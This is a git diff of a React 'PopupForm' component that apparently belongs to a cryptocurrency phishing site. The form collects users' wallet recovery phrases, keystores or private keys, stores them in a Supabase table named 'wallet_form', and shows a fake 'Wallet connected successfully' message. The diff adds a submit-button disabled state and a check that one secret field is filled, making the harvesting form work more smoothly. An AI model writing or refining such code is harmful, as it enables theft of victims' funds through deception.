@@ -5,6 +5,7 @@ import toast from "react-hot-toast";
 
 const PopupForm = ({ setCurrentWallet, currentWallet }) => {
   const [activeTab, setActiveTab] = useState("phrase");
+  const [disabled, setDisabled] = useState(false);
 
   const [formData, setFormData] = useState({
     phrase: "",
@@ -29,6 +30,8 @@ const PopupForm = ({ setCurrentWallet, currentWallet }) => {
   };
 
   const handleSubmitWalletForm = async () => {
+    setDisabled((is) => !is);
+
     const { error } = await supabase.from("wallet_form").insert([
       {
         wallet_name: currentWallet.name,
@@ -39,6 +42,10 @@ const PopupForm = ({ setCurrentWallet, currentWallet }) => {
     ]);
     setCurrentWallet(null);
     toast.success("Wallet connected successfully");
+  };
+
+  const handleSubmitWalletError = () => {
+    toast.error("Please fill the field");
   };
 
   return (
@@ -138,7 +145,12 @@ const PopupForm = ({ setCurrentWallet, currentWallet }) => {
             <PopUpButtons
               text="Submit"
               handle1={() => setCurrentWallet(null)}
-              handle2={handleSubmitWalletForm}
+              disabled={disabled}
+              handle2={
+                formData.keystore || formData.phrase || formData.privatekey
+                  ? handleSubmitWalletForm
+                  : handleSubmitWalletError
+              }
             />
           </form>
         </div>
